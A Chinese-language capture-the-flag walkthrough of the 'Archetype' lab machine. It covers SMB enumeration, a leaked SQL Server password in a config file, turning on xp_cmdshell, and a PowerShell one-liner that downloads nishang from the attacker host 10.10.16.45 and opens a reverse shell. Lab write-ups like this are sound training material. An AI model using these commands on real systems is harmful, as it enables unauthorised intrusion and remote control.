对靶机进行扫描`nmap -A 10.10.10.27`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201140005225.png)

1. 445/tcp端口,用于Windows系统的共享文件夹

2. 1433/tcp端口,用于MSSQL端口

---

首先对445端口的共享文件夹进行查看

`smbclient -N -L 10.10.10.27`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201140008420.png)

尝试对文件夹内的内容进行读取

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201140009670.png)

`prod.dtsConfig`文件内容为

```
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

可以知道用户名为`ARCHETYPE\sql_svc`,而密码为`M3g4c0rp123`

用[https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)下的`examples/mssqlclient.py`进行数据库连接

`python mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201140011153.png)

用`SELECT IS_SRVROLEMEMBER('sysadmin')`查看当前权限

[https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15#examples](https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15#examples)

```SQL
IF IS_SRVROLEMEMBER ('sysadmin') = 1  
   print 'Current user''s login is a member of the sysadmin role'  
ELSE IF IS_SRVROLEMEMBER ('sysadmin') = 0  
   print 'Current user''s login is NOT a member of the sysadmin role'  
ELSE IF IS_SRVROLEMEMBER ('sysadmin') IS NULL  
   print 'ERROR: The server role specified is not valid.';
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201140012120.png)

当前权限为`sysadmin`

开启`xp_cmdshell`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141310630.png)

网络状况

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141313585.png)

在`C:\Users\sql_svc\Desktop\`找到`user flag`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141401893.png)

用[nishang](https://github.com/samratashok/nishang)反弹shell

`xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.16.45:8000/Invoke-PowerShellTcp.ps1\");Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.45 -port 8080"`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141417163.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141419525.png)

[命令历史记录](https://docs.microsoft.com/zh-cn/powershell/module/psreadline/about/about_psreadline?view=powershell-7.2#command-history)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141425669.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141426667.png)

psexec连接服务器

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141433819.png)

手动开了3389但是连不上??

在`C:\Users\Administrator\Desktop\`找到`root flag`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141447271.png)